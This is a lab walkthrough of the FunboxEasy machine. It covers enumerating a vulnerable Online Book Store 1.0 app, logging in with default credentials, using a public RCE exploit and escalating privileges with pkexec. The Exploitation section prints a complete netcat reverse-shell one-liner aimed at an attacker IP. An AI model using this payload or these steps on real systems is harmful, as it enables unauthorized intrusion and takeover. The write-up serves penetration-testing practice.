FunboxEasy

Target IP: 192.168.170.111

Scanning



There are three TCP ports open on the host machine: SSH, HTTP, and MySQL. I will begin my enumeration with the HTTP application.

Enumeration

Port 80: HTTP

Doing a directory search gives us a wealth of information. After some manual enumeration, I found an interesting bookstore application.

/store

The host is running an online bookstore. The software is Online Book Store 1.0.


I was able to successfully login to the application by using default credentials of admin:admin.


Doing a Google search shows this application version is vulnerable to RCE without authentication.

Exploitation


I used the verified public exploit against the CSE bookstore application. Now I have a simple shell. I will need to gain a full reverse shell connection.


I used the payload rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.211 8443 >/tmp/f in the exploit to gain a reverse shell connection on port 8443. The terminal on the left above is my reverse shell connection. The terminal on the right above is where I send the payload above to gain that reverse shell connection. Now I have a foothold on the machine.

Privilege Escalation


I found an interesting file called password.txt owned by tony. It seems like tony likes to write down his passwords. The most interesting password from the list is the SSH. If tony is correct, we should be able to login to SSH as tony:yxcvbnmYYY.


And it worked. I have access to the SSH as tony.


Gaining a root shell was super simple. I used pkexec binary to elevate my privileges. To accomplish this, I entered the command sudo pkexed /bin/sh.

Flag


This challenge only contains one flag called proof.txt. After gaining a root shell using pkexec, the flag is inside /root directory.
